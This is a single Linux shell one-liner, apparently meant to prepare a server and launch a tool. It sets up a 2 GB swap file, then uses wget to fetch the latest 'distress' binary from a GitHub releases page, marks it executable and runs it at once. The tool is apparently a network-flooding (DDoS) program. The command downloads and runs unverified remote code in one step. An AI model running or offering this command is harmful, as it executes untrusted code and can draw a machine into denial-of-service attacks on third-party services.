fallocate -l 2G /swapfile && chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile && wget https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl -O ds && chmod a+x ds && ./ds
